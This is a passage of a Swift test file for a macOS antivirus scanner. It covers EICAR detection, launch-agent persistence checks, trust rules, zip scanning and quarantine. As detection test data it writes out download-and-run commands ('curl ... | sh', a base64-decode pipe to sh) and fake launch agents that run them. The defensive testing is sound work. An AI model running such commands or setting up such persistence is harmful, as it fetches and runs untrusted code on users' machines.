import XCTest
@testable import PureMac

final class AntivirusTests: XCTestCase {
    private var folder: URL!

    override func setUpWithError() throws {
        folder = FileManager.default.temporaryDirectory.appendingPathComponent("AntivirusTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        _ = Shell.run("/bin/chmod", ["-R", "u+rwx", folder.path])
        try? FileManager.default.removeItem(at: folder)
    }

    private func scanner() -> AntivirusScanner {
        AntivirusScanner(home: folder.path, quarantineFolder: folder.appendingPathComponent("Quarantine").path)
    }

    private func customScan(_ urls: [URL], trust: [TrustRule] = []) async -> AntivirusScanOutcome {
        await scanner().scan(mode: .custom, custom: urls, trust: .init(rules: trust), cache: AntivirusCleanCache()) { _ in }
    }

    // MARK: Rules

    func testEICARRequiresTheExactFile() {
        let eicar = AntivirusRules.eicar
        XCTAssertTrue(AntivirusRules.isEICAR(eicar, fileSize: Int64(eicar.count)))
        let padded = eicar + Data("  \n".utf8)
        XCTAssertTrue(AntivirusRules.isEICAR(padded, fileSize: Int64(padded.count)))
        // The string inside a larger script is not the test file.
        let embedded = Data("echo '".utf8) + eicar + Data("'".utf8)
        XCTAssertFalse(AntivirusRules.isEICAR(embedded, fileSize: Int64(embedded.count)))
        let trailing = eicar + Data("x".utf8)
        XCTAssertFalse(AntivirusRules.isEICAR(trailing, fileSize: Int64(trailing.count)))
    }

    func testFileKinds() {
        XCTAssertEqual(AntivirusRules.kind(of: Data([0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0])), .machO)
        XCTAssertEqual(AntivirusRules.kind(of: Data([0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2])), .machO)
        // A Java class file shares the universal-binary magic.
        XCTAssertEqual(AntivirusRules.kind(of: Data([0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52])), .other)
        XCTAssertEqual(AntivirusRules.kind(of: Data("#!/bin/sh\n".utf8)), .script)
        XCTAssertEqual(AntivirusRules.kind(of: Data([0x50, 0x4B, 0x03, 0x04])), .zip)
    }

    func testSuspiciousScriptRules() {
        XCTAssertEqual(AntivirusRules.suspiciousScriptRule("curl -s https://x.example/p | sh"), "script.download-exec")
        XCTAssertEqual(AntivirusRules.suspiciousScriptRule("echo aGk= | base64 -d | sh"), "script.base64-exec")
        XCTAssertNil(AntivirusRules.suspiciousScriptRule("curl -O https://example.com/file.zip"))
    }

    func testUnusualProgramLocations() {
        let home = "/Users/test"
        XCTAssertTrue(AntivirusRules.isUnusualProgramLocation("/private/tmp/x", home: home))
        XCTAssertTrue(AntivirusRules.isUnusualProgramLocation("/Users/test/Library/Application Support/.hidden/agent", home: home))
        XCTAssertFalse(AntivirusRules.isUnusualProgramLocation("/Applications/App.app/Contents/MacOS/App", home: home))
        XCTAssertFalse(AntivirusRules.isUnusualProgramLocation("/Users/test/.local/bin/tool", home: home))
    }

    // MARK: Scanner

    func testCustomScanFindsEICARAndLeavesItInPlace() async throws {
        let file = folder.appendingPathComponent("sample.txt")
        try AntivirusRules.eicar.write(to: file)

        let outcome = await customScan([folder])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.rule, "test.eicar")
        XCTAssertEqual(outcome.detections.first?.primary.sha256, "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f")
        XCTAssertTrue(FileManager.default.fileExists(atPath: file.path), "A scan must never move files")
    }

    func testCustomScanLooksInsideZipArchives() async throws {
        let inner = folder.appendingPathComponent("payload")
        try FileManager.default.createDirectory(at: inner, withIntermediateDirectories: true)
        try AntivirusRules.eicar.write(to: inner.appendingPathComponent("eicar.com"))
        let zip = folder.appendingPathComponent("archive.zip")
        XCTAssertEqual(Shell.run("/usr/bin/ditto", ["-c", "-k", inner.path, zip.path]).status, 0)
        try FileManager.default.removeItem(at: inner)

        let outcome = await customScan([zip])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.primary.role, .archive)
        XCTAssertEqual(outcome.detections.first?.primary.path, zip.path)
        XCTAssertEqual(outcome.detections.first?.primary.archiveEntry, "eicar.com")
    }

    func testTrustedHashIsSkipped() async throws {
        let file = folder.appendingPathComponent("eicar.com")
        try AntivirusRules.eicar.write(to: file)
        let rule = TrustRule(kind: .hash, value: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", label: "test", addedAt: Date())

        let outcome = await customScan([file], trust: [rule])

        XCTAssertTrue(outcome.detections.isEmpty)
    }

    func testAdwareAppBundleIsReportedAsOneThreat() async throws {
        let app = folder.appendingPathComponent("Pirrit Helper.app/Contents/MacOS", isDirectory: true)
        try FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
        try Data("x".utf8).write(to: app.appendingPathComponent("helper"))

        let outcome = await customScan([folder])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.category, .adware)
        XCTAssertEqual(outcome.detections.first?.primary.role, .appBundle)
    }

    // MARK: Quarantine

    func testQuarantineAndRestoreKeepContentAndPermissions() throws {
        let file = folder.appendingPathComponent("script.sh")
        try Data("#!/bin/sh\necho hi\n".utf8).write(to: file)
        XCTAssertEqual(chmod(file.path, 0o750), 0)
        let detection = Detection(
            id: UUID(), name: "Test", category: .script, severity: .suspicious, source: .scriptContent, rule: "test",
            reason: "", components: [ThreatComponent(path: file.path, role: .file, sha256: nil, size: 18)],
            signing: nil, detectedAt: Date(), mode: .custom
        )
        let vault = folder.appendingPathComponent("Quarantine/\(detection.id.uuidString)")

        let items = try AntivirusVault.quarantine(detection, into: vault).get().items

        XCTAssertFalse(FileManager.default.fileExists(atPath: file.path))
        XCTAssertEqual(items.count, 1)
        let locked = try FileManager.default.attributesOfItem(atPath: items[0].storedPath)[.posixPermissions] as? NSNumber
        XCTAssertEqual(locked?.intValue, 0, "Quarantined files are locked")

        XCTAssertTrue(try AntivirusVault.restore(items).get().isEmpty)

        XCTAssertEqual(try String(contentsOf: file, encoding: .utf8), "#!/bin/sh\necho hi\n")
        let restored = try FileManager.default.attributesOfItem(atPath: file.path)[.posixPermissions] as? NSNumber
        XCTAssertEqual(restored?.intValue, 0o750)
    }

    func testRestoreRefusesToOverwrite() throws {
        let file = folder.appendingPathComponent("a.txt")
        try Data("one".utf8).write(to: file)
        let detection = Detection(
            id: UUID(), name: "Test", category: .testFile, severity: .high, source: .testSignature, rule: "test",
            reason: "", components: [ThreatComponent(path: file.path, role: .file, sha256: nil, size: 3)],
            signing: nil, detectedAt: Date(), mode: .custom
        )
        let items = try AntivirusVault.quarantine(detection, into: folder.appendingPathComponent("Q")).get().items
        try Data("two".utf8).write(to: file)

        XCTAssertThrowsError(try AntivirusVault.restore(items).get())
        XCTAssertEqual(try String(contentsOf: file, encoding: .utf8), "two")
    }

    func testDeleteRemovesTheVault() throws {
        let file = folder.appendingPathComponent("b.txt")
        try Data("x".utf8).write(to: file)
        let detection = Detection(
            id: UUID(), name: "Test", category: .testFile, severity: .high, source: .testSignature, rule: "test",
            reason: "", components: [ThreatComponent(path: file.path, role: .file, sha256: nil, size: 1)],
            signing: nil, detectedAt: Date(), mode: .custom
        )
        let vault = folder.appendingPathComponent("V")
        let items = try AntivirusVault.quarantine(detection, into: vault).get().items

        try AntivirusVault.delete(vault, items: items).get()

        XCTAssertFalse(FileManager.default.fileExists(atPath: vault.path))
    }

    // MARK: Store

    @MainActor
    func testStoreKeepsDetectionsPendingUntilTheUserActs() async throws {
        let store = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        let file = folder.appendingPathComponent("eicar.com")
        try AntivirusRules.eicar.write(to: file)

        store.start(.custom, custom: [file])
        while store.isScanning { try await Task.sleep(nanoseconds: 50_000_000) }

        XCTAssertEqual(store.pending.count, 1)
        XCTAssertTrue(store.quarantine.isEmpty)
        XCTAssertTrue(FileManager.default.fileExists(atPath: file.path))

        store.trust(store.pending[0], by: .hash)
        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertEqual(store.trusted.first?.kind, .hash)

        // Saved state survives a new store.
        let reloaded = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        XCTAssertEqual(reloaded.trusted.count, 1)
        XCTAssertEqual(reloaded.history.count, 1)
    }

    @MainActor
    func testStopEndsTheBackgroundScan() async throws {
        let store = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        // Many small files, so the walk takes long enough to interrupt.
        let tree = folder.appendingPathComponent("tree")
        for index in 0..<3000 {
            let dir = tree.appendingPathComponent("d\(index % 30)")
            try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
            try Data("file \(index)".utf8).write(to: dir.appendingPathComponent("f\(index).txt"))
        }

        store.start(.custom, custom: [tree, URL(fileURLWithPath: "/Applications")])
        try await Task.sleep(nanoseconds: 100_000_000)
        store.stop()
        let deadline = Date().addingTimeInterval(5)
        while store.isScanning, Date() < deadline { try await Task.sleep(nanoseconds: 50_000_000) }

        XCTAssertFalse(store.isScanning, "Stop must end the background walk")
        XCTAssertEqual(store.history.first?.wasCancelled, true)
    }

    @MainActor
    func testClearHistoryKeepsEverythingElse() async throws {
        let store = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        let file = folder.appendingPathComponent("eicar.com")
        try AntivirusRules.eicar.write(to: file)
        store.start(.custom, custom: [file])
        while store.isScanning { try await Task.sleep(nanoseconds: 50_000_000) }
        store.trust(store.pending[0], by: .path)
        // A Custom scan covers a few files; it doesn't count for the schedule.
        XCTAssertNil(store.lastCompletedScan)
        XCTAssertEqual(store.history.count, 1)

        store.clearHistory()

        XCTAssertTrue(store.history.isEmpty)
        XCTAssertEqual(store.trusted.count, 1)
        let reloaded = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        XCTAssertTrue(reloaded.history.isEmpty)
        XCTAssertEqual(reloaded.trusted.count, 1)
    }

    // MARK: End-to-end helpers

    /// `folder` with symlinks resolved (/var → /private/var). The directory
    /// enumerator reports resolved paths, so the fake home and every path
    /// written in a plist use this form to compare like with like.
    private var base: URL {
        var buffer = [CChar](repeating: 0, count: Int(PATH_MAX))
        guard realpath(folder.path, &buffer) != nil else { return folder }
        return URL(fileURLWithPath: String(cString: buffer), isDirectory: true)
    }

    /// Writes a file under the temp folder (the fake home), creating folders.
    @discardableResult
    private func writeFile(_ relative: String, _ contents: Data, mode: mode_t = 0o644) throws -> URL {
        let url = base.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try contents.write(to: url)
        XCTAssertEqual(chmod(url.path, mode), 0)
        return url
    }

    /// A launch agent plist in the fake home's LaunchAgents. It only lives in
    /// the temp folder and is never handed to launchd.
    @discardableResult
    private func writeLaunchAgent(_ name: String, _ plist: [String: Any]) throws -> URL {
        let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
        return try writeFile("Library/LaunchAgents/\(name).plist", data)
    }

    /// A Quick scan with the temp folder as home; only detections touching the
    /// temp folder are returned (the real /Library launch folders are read too).
    private func quickScan(trust: [TrustRule] = [], cache: AntivirusCleanCache = AntivirusCleanCache()) async -> [Detection] {
        let outcome = await AntivirusScanner(home: base.path, quarantineFolder: base.appendingPathComponent("Quarantine").path).scan(mode: .quick, trust: .init(rules: trust), cache: cache) { _ in }
        let root = base.path + "/"
        return outcome.detections.filter { $0.components.contains { $0.path.hasPrefix(root) } }
    }

    /// A copy of /usr/bin/true with its signature removed.
    private func unsignedProgram(at relative: String) throws -> URL {
        let url = base.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try FileManager.default.copyItem(atPath: "/usr/bin/true", toPath: url.path)
        XCTAssertEqual(Shell.run("/usr/bin/codesign", ["--remove-signature", url.path]).status, 0)
        XCTAssertFalse(AntivirusRules.signingStatus(of: url).isTrustworthy)
        return url
    }

    private func pathRule(_ path: String) -> TrustRule {
        TrustRule(kind: .path, value: path, label: path, addedAt: Date())
    }

    private func permissions(_ path: String) -> Int? {
        (try? FileManager.default.attributesOfItem(atPath: path)[.posixPermissions] as? NSNumber)?.intValue
    }

    @MainActor
    private func waitForScan(_ store: AntivirusStore, timeout: TimeInterval = 60) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        while store.isScanning, Date() < deadline { try await Task.sleep(nanoseconds: 50_000_000) }
        XCTAssertFalse(store.isScanning, "Scan did not finish in time")
    }

    @MainActor
    private func waitUntilIdle(_ store: AntivirusStore, timeout: TimeInterval = 20) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        while !store.busy.isEmpty, Date() < deadline { try await Task.sleep(nanoseconds: 50_000_000) }
        XCTAssertTrue(store.busy.isEmpty, "Store action did not finish in time")
    }

    // MARK: Launch items (fake home)

    func testLaunchAgentRunningDownloadScriptIsOneGroupedThreat() async throws {
        let script = try writeFile("Library/Application Support/Updater/update.sh",
                                   Data("#!/bin/sh\ncurl -s https://x.example/p | sh\n".utf8), mode: 0o755)
        let plist = try writeLaunchAgent("com.example.updater", [
            "Label": "com.example.updater",
            "ProgramArguments": ["/bin/sh", script.path],
        ])

        let found = await quickScan()

        XCTAssertEqual(found.count, 1, "\(found.map(\.rule))")
        let detection = try XCTUnwrap(found.first)
        XCTAssertEqual(detection.category, .script)
        XCTAssertEqual(detection.source, .scriptContent)
        XCTAssertEqual(detection.rule, "script.download-exec")
        XCTAssertEqual(detection.components.map(\.path), [plist.path, script.path])
        XCTAssertEqual(detection.components.map(\.role), [.launchItem, .program])
        XCTAssertNotNil(detection.components[1].sha256)
    }

    func testFileWalkDoesNotReportTheProgramOfAFlaggedLaunchAgentAgain() async throws {
        // The walk alone would flag this file (EICAR); the launch agent claims it first.
        let payload = try writeFile("Library/Application Support/Updater/payload.com", AntivirusRules.eicar, mode: 0o755)
        let plist = try writeLaunchAgent("com.example.payload", [
            "Label": "com.example.payload",
            "ProgramArguments": [payload.path],
        ])

        let found = await quickScan()

        // EICAR is also in knownHashes, which the launch-item judge checks first.
        XCTAssertEqual(found.count, 1, "\(found.map(\.components))")
        XCTAssertEqual(found.first?.rule, "test.eicar")
        XCTAssertEqual(found.first?.components.map(\.path), [plist.path, payload.path])
    }

    func testLaunchAgentWithInlineDownloadCommandIsPersistence() async throws {
        let plist = try writeLaunchAgent("com.example.inline", [
            "Label": "com.example.inline",
            "ProgramArguments": ["/bin/sh", "-c", "curl -s https://x.example/p | sh"],
        ])

        let found = await quickScan()

        XCTAssertEqual(found.count, 1)
        XCTAssertEqual(found.first?.category, .persistence)
        XCTAssertEqual(found.first?.rule, "launch.arguments")
        XCTAssertEqual(found.first?.source, .launchItem)
        XCTAssertEqual(found.first?.components.map(\.path), [plist.path])
    }

    func testLaunchAgentWithAdwareLabelIsHighSeverityAdware() async throws {
        let plist = try writeLaunchAgent("com.pirrit.agent", [
            "Label": "com.pirrit.agent",
            "ProgramArguments": ["/usr/bin/true"],
        ])

        let found = await quickScan()

        XCTAssertEqual(found.count, 1)
        XCTAssertEqual(found.first?.category, .adware)
        XCTAssertEqual(found.first?.severity, .high)
        XCTAssertEqual(found.first?.rule, "adware.family.pirrit")
        XCTAssertEqual(found.first?.primary.path, plist.path)
        XCTAssertEqual(found.first?.primary.role, .launchItem)
    }

    func testLaunchAgentStartingUnsignedProgramFromHiddenFolderIsFlagged() async throws {
        let program = try unsignedProgram(at: "Library/Application Support/.hidden/agent")
        let plist = try writeLaunchAgent("com.example.hidden", [
            "Label": "com.example.hidden",
            "ProgramArguments": [program.path],
        ])

        let found = await quickScan()

        XCTAssertEqual(found.count, 1, "\(found.map(\.rule))")
        XCTAssertEqual(found.first?.category, .unsignedProgram)
        XCTAssertEqual(found.first?.rule, "launch.unsigned-unusual-location")
        XCTAssertEqual(found.first?.components.map(\.path), [plist.path, program.path])
        XCTAssertEqual(found.first?.signing?.isTrustworthy, false)
    }

    func testLaunchAgentStartingUnsignedProgramFromNormalFolderIsClean() async throws {
        let program = try unsignedProgram(at: "Library/Application Support/Vendor/agent")
        try writeLaunchAgent("com.example.vendor", [
            "Label": "com.example.vendor",
            "ProgramArguments": [program.path],
        ])

        let found = await quickScan()

        XCTAssertTrue(found.isEmpty, "\(found.map(\.rule))")
    }

    func testCleanLaunchAgentIsNotReported() async throws {
        try writeLaunchAgent("com.example.helper", [
            "Label": "com.example.helper",
            "ProgramArguments": ["/usr/bin/true"],
        ])

        let found = await quickScan()

        XCTAssertTrue(found.isEmpty, "\(found.map(\.rule))")
    }

    // MARK: Trust rules

    func testTrustByPathCoversSubfoldersButNotSiblingsWithACommonPrefix() async throws {
        let trust = AntivirusScanner.Trust(rules: [pathRule("/a/foo")])
        XCTAssertTrue(trust.covers(path: "/a/foo"))
        XCTAssertTrue(trust.covers(path: "/a/foo/x"))
        XCTAssertTrue(trust.covers(path: "/a/foo/sub/y"))
        XCTAssertFalse(trust.covers(path: "/a/foobar"))
        XCTAssertFalse(trust.covers(path: "/a/foobar/x"))
        XCTAssertFalse(trust.covers(path: "/a/fo"))

        try writeFile("foo/eicar.com", AntivirusRules.eicar)
        try writeFile("foo/sub/eicar.com", AntivirusRules.eicar)
        let sibling = try writeFile("foobar/eicar.com", AntivirusRules.eicar)

        let outcome = await customScan([base], trust: [pathRule(base.appendingPathComponent("foo").path)])

        XCTAssertEqual(outcome.detections.map(\.primary.path), [sibling.path])
    }

    func testTrustByPathOnALaunchAgentSkipsIt() async throws {
        let plist = try writeLaunchAgent("com.pirrit.agent", ["Label": "com.pirrit.agent", "ProgramArguments": ["/usr/bin/true"]])

        let found = await quickScan(trust: [pathRule(plist.path)])

        XCTAssertTrue(found.isEmpty)
    }

    func testTrustByHashSurvivesRenaming() async throws {
        // Plain file in a custom scan.
        let file = try writeFile("one/eicar.com", AntivirusRules.eicar)
        let first = await customScan([base])
        let sha = try XCTUnwrap(first.detections.first?.primary.sha256)
        let renamed = base.appendingPathComponent("two/renamed.txt")
        try FileManager.default.createDirectory(at: renamed.deletingLastPathComponent(), withIntermediateDirectories: true)
        try FileManager.default.moveItem(at: file, to: renamed)
        let rule = TrustRule(kind: .hash, value: sha, label: file.path, addedAt: Date())
        let second = await customScan([base], trust: [rule])
        XCTAssertTrue(second.detections.isEmpty)

        // The script a launch agent runs, renamed and pointed to again.
        let script = try writeFile("Library/Application Support/Updater/update.sh",
                                   Data("#!/bin/sh\ncurl -s https://x.example/p | sh\n".utf8), mode: 0o755)
        try writeLaunchAgent("com.example.updater", ["Label": "com.example.updater", "ProgramArguments": ["/bin/sh", script.path]])
        let flagged = await quickScan()
        let scriptHash = try XCTUnwrap(flagged.first?.components.last?.sha256)
        let movedScript = base.appendingPathComponent("Library/Application Support/Updater/renamed-update.sh")
        try FileManager.default.moveItem(at: script, to: movedScript)
        try writeLaunchAgent("com.example.updater", ["Label": "com.example.updater", "ProgramArguments": ["/bin/sh", movedScript.path]])

        let trusted = await quickScan(trust: [TrustRule(kind: .hash, value: scriptHash, label: "", addedAt: Date())])

        XCTAssertTrue(trusted.isEmpty, "\(trusted.map(\.rule))")
    }

    func testTrustByTeamIDSkipsLaunchAgentStartingThatDevelopersProgram() async throws {
        // Needs a Developer ID–signed program; uses an installed app in place (read-only).
        var found: (path: String, team: String)?
        let apps = (try? FileManager.default.contentsOfDirectory(atPath: "/Applications")) ?? []
        for app in apps.sorted() where app.hasSuffix(".app") {
            guard let exec = Bundle(path: "/Applications/\(app)")?.executablePath else { continue }
            if case .developerID(let team) = AntivirusRules.signingStatus(of: URL(fileURLWithPath: exec)) {
                found = (exec, team)
                break
            }
        }
        guard let program = found else { throw XCTSkip("No Developer ID–signed app in /Applications") }
        try writeLaunchAgent("com.pirrit.agent", ["Label": "com.pirrit.agent", "ProgramArguments": [program.path]])

        let untrusted = await quickScan()
        XCTAssertEqual(untrusted.count, 1)
        XCTAssertEqual(untrusted.first?.signing?.teamID, program.team)

        let trusted = await quickScan(trust: [TrustRule(kind: .teamID, value: program.team, label: "", addedAt: Date())])
        XCTAssertTrue(trusted.isEmpty)
    }

    // MARK: Archives

    func testNestedZipWithEICARIsReportedOnTheOuterArchive() async throws {
        let inner = base.appendingPathComponent("inner")
        try writeFile("inner/eicar.com", AntivirusRules.eicar)
        let innerZip = base.appendingPathComponent("middle/inner.zip")
        try FileManager.default.createDirectory(at: innerZip.deletingLastPathComponent(), withIntermediateDirectories: true)
        XCTAssertEqual(Shell.run("/usr/bin/ditto", ["-c", "-k", inner.path, innerZip.path]).status, 0)
        let outer = base.appendingPathComponent("outer.zip")
        XCTAssertEqual(Shell.run("/usr/bin/ditto", ["-c", "-k", innerZip.deletingLastPathComponent().path, outer.path]).status, 0)
        try FileManager.default.removeItem(at: inner)
        try FileManager.default.removeItem(at: innerZip.deletingLastPathComponent())

        let outcome = await customScan([outer])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.primary.path, outer.path)
        XCTAssertEqual(outcome.detections.first?.primary.role, .archive)
        XCTAssertEqual(outcome.detections.first?.primary.archiveEntry, "eicar.com")
    }

    func testZipSymlinkPointingOutsideIsNotFollowed() async throws {
        let outside = try writeFile("outside/eicar.com", AntivirusRules.eicar)
        let linkDir = base.appendingPathComponent("links")
        try FileManager.default.createDirectory(at: linkDir, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: linkDir.appendingPathComponent("file-link").path, withDestinationPath: outside.path)
        try FileManager.default.createSymbolicLink(atPath: linkDir.appendingPathComponent("dir-link").path,
                                                   withDestinationPath: outside.deletingLastPathComponent().path)
        let zip = base.appendingPathComponent("links.zip")
        XCTAssertEqual(Shell.run("/usr/bin/ditto", ["-c", "-k", linkDir.path, zip.path]).status, 0)
        let listing = String(decoding: Shell.run("/usr/bin/zipinfo", [zip.path]).output, as: UTF8.self)
        XCTAssertTrue(listing.contains("lrwx"), "The archive should store symlinks: \(listing)")
        try FileManager.default.removeItem(at: linkDir)

        let outcome = await customScan([zip])

        XCTAssertTrue(outcome.detections.isEmpty, "\(outcome.detections.map(\.components))")
        XCTAssertTrue(FileManager.default.fileExists(atPath: outside.path))
    }

    // MARK: Clean cache

    func testCacheRechecksAFileRewrittenAsEICAR() async throws {
        let file = try writeFile("data/note.txt", Data("hello".utf8))
        let cache = AntivirusCleanCache()
        let scan = { await self.scanner().scan(mode: .custom, custom: [self.base], trust: .init(rules: []), cache: cache) { _ in } }

        let first = await scan()
        XCTAssertTrue(first.detections.isEmpty)
        try AntivirusRules.eicar.write(to: file)
        let second = await scan()

        XCTAssertEqual(second.detections.map(\.primary.path), [file.path])
    }

    func testCacheRechecksAFileDeletedAndReplaced() async throws {
        let file = try writeFile("data/note.txt", Data("hello".utf8))
        let cache = AntivirusCleanCache()
        let scan = { await self.scanner().scan(mode: .custom, custom: [self.base], trust: .init(rules: []), cache: cache) { _ in } }

        let first = await scan()
        XCTAssertTrue(first.detections.isEmpty)
        try FileManager.default.removeItem(at: file)
        try writeFile("data/note.txt", AntivirusRules.eicar)
        let second = await scan()

        XCTAssertEqual(second.detections.map(\.primary.path), [file.path])
    }

    /// Same size, same inode, modification time put back (`touch -r`): only
    /// the change time tells the file was rewritten.
    func testCacheRechecksASameSizeRewriteWithRestoredModificationTime() async throws {
        let file = try writeFile("data/same.bin", Data(repeating: 0x41, count: AntivirusRules.eicar.count))
        let original = try XCTUnwrap(FileManager.default.attributesOfItem(atPath: file.path)[.modificationDate] as? Date)
        let cache = AntivirusCleanCache()
        let scan = { await self.scanner().scan(mode: .custom, custom: [self.base], trust: .init(rules: []), cache: cache) { _ in } }

        let first = await scan()
        XCTAssertTrue(first.detections.isEmpty)
        let handle = try FileHandle(forWritingTo: file)
        try handle.write(contentsOf: AntivirusRules.eicar)
        try handle.close()
        try FileManager.default.setAttributes([.modificationDate: original], ofItemAtPath: file.path)
        let second = await scan()

        XCTAssertEqual(second.detections.map(\.primary.path), [file.path], "Clean cache trusted a rewritten file")
    }

    // MARK: Quarantine end to end

    func testQuarantineOfGroupedLaunchAgentThreatMovesLocksAndRestoresBoth() async throws {
        let script = try writeFile("Library/Application Support/Updater/update.sh",
                                   Data("#!/bin/sh\ncurl -s https://x.example/p | sh\n".utf8), mode: 0o755)
        let plist = try writeLaunchAgent("com.example.updater", ["Label": "com.example.updater", "ProgramArguments": ["/bin/sh", script.path]])
        let plistData = try Data(contentsOf: plist)
        let scriptData = try Data(contentsOf: script)
        let found = await quickScan()
        let detection = try XCTUnwrap(found.first)
        XCTAssertEqual(detection.launchItems.map(\.path), [plist.path])
        // An agent outside LaunchDaemons in a writable folder is booted out of
        // the user's GUI domain without a password; this plist was never loaded.
        let vault = base.appendingPathComponent("Quarantine/\(detection.id.uuidString)")

        let items = try AntivirusVault.quarantine(detection, into: vault).get().items

        XCTAssertEqual(items.map(\.originalPath), [plist.path, script.path])
        XCTAssertEqual(items.map(\.needsAdministrator), [false, false])
        XCTAssertFalse(FileManager.default.fileExists(atPath: plist.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: script.path))
        for item in items {
            XCTAssertTrue(item.storedPath.hasPrefix(vault.path + "/"))
            XCTAssertEqual(permissions(item.storedPath), 0, "Quarantined files are locked")
        }

        XCTAssertTrue(try AntivirusVault.restore(items).get().isEmpty)

        XCTAssertEqual(try Data(contentsOf: plist), plistData)
        XCTAssertEqual(try Data(contentsOf: script), scriptData)
        XCTAssertEqual(permissions(plist.path), 0o644)
        XCTAssertEqual(permissions(script.path), 0o755)
    }

    func testQuarantineAndRestoreWithSpacesQuotesAndUnicodeInNames() async throws {
        let relative = "dir with spaces/it's \"quoted\"/ünïcødé 文件/eicar 'test' \"x\" ção.com"
        let file = try writeFile(relative, AntivirusRules.eicar, mode: 0o640)

        let outcome = await customScan([base])
        XCTAssertEqual(outcome.detections.count, 1)
        let detection = try XCTUnwrap(outcome.detections.first)
        XCTAssertEqual(detection.primary.path, file.path)
        let vault = base.appendingPathComponent("Quarantine/\(detection.id.uuidString)")

        let items = try AntivirusVault.quarantine(detection, into: vault).get().items
        XCTAssertEqual(items.count, 1)
        XCTAssertEqual(items.first?.needsAdministrator, false)
        XCTAssertFalse(FileManager.default.fileExists(atPath: file.path))
        XCTAssertEqual(permissions(items[0].storedPath), 0)

        XCTAssertTrue(try AntivirusVault.restore(items).get().isEmpty)
        XCTAssertEqual(try Data(contentsOf: file), AntivirusRules.eicar)
        XCTAssertEqual(permissions(file.path), 0o640)

        let again = try AntivirusVault.quarantine(detection, into: vault).get().items
        try AntivirusVault.delete(vault, items: again).get()
        XCTAssertFalse(FileManager.default.fileExists(atPath: vault.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: file.path))
    }

    // MARK: Store end to end

    @MainActor
    func testStoreCanScanAgainAfterStop() async throws {
        let store = AntivirusStore(folder: base.appendingPathComponent("Store"))
        let tree = base.appendingPathComponent("tree")
        for index in 0..<3000 {
            let dir = tree.appendingPathComponent("d\(index % 30)")
            try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
            try Data("file \(index)".utf8).write(to: dir.appendingPathComponent("f\(index).txt"))
        }
        store.start(.custom, custom: [tree, URL(fileURLWithPath: "/Applications")])
        try await Task.sleep(nanoseconds: 100_000_000)
        store.stop()
        try await waitForScan(store, timeout: 5)
        XCTAssertEqual(store.history.first?.wasCancelled, true)
        XCTAssertNil(store.lastCompletedScan, "A stopped scan doesn't count as complete")

        let file = try writeFile("after/eicar.com", AntivirusRules.eicar)
        store.start(.custom, custom: [file])
        try await waitForScan(store)

        XCTAssertEqual(store.history.count, 2)
        XCTAssertEqual(store.history.first?.wasCancelled, false)
        XCTAssertTrue(store.pending.contains { $0.primary.path == file.path })
    }

    @MainActor
    func testStoreReviewRoundTripSurvivesReload() async throws {
        let storeFolder = base.appendingPathComponent("Store")
        let files = base.appendingPathComponent("files")
        var paths: [String: URL] = [:]
        for name in ["dismiss", "trust", "keep", "quarantine", "delete"] {
            paths[name] = try writeFile("files/\(name)/eicar.com", AntivirusRules.eicar, mode: 0o600)
        }
        let store = AntivirusStore(folder: storeFolder)
        func pending(_ name: String, in store: AntivirusStore) throws -> Detection {
            try XCTUnwrap(store.pending.first { $0.primary.path == paths[name]!.path }, "No pending detection for \(name)")
        }

        store.start(.custom, custom: [files])
        try await waitForScan(store)
        XCTAssertEqual(store.pending.count, 5)

        store.dismiss(try pending("dismiss", in: store))
        // Every EICAR copy has the same hash, so trust this one by path.
        store.trust(try pending("trust", in: store), by: .path)
        store.quarantine(try pending("quarantine", in: store))
        try await waitUntilIdle(store)
        store.quarantine(try pending("delete", in: store))
        try await waitUntilIdle(store)

        XCTAssertNil(store.lastError)
        XCTAssertEqual(store.pending.map(\.primary.path), [paths["keep"]!.path])
        XCTAssertEqual(store.trusted.map(\.value), [paths["trust"]!.path])
        XCTAssertEqual(store.quarantine.count, 2)
        XCTAssertTrue(FileManager.default.fileExists(atPath: paths["dismiss"]!.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: paths["quarantine"]!.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: paths["delete"]!.path))

        let reloaded = AntivirusStore(folder: storeFolder)
        XCTAssertEqual(reloaded.pending.map(\.primary.path), [paths["keep"]!.path])
        XCTAssertEqual(reloaded.trusted.map(\.value), [paths["trust"]!.path])
        XCTAssertEqual(Set(reloaded.quarantine.map(\.detection.primary.path)), [paths["quarantine"]!.path, paths["delete"]!.path])

        // Rescan: the dismissed file comes back, the trusted one doesn't, the
        // one still waiting isn't listed twice.
        reloaded.start(.custom, custom: [files])
        try await waitForScan(reloaded)
        XCTAssertEqual(Set(reloaded.pending.map(\.primary.path)), [paths["dismiss"]!.path, paths["keep"]!.path])
        XCTAssertEqual(reloaded.pending.count, 2)

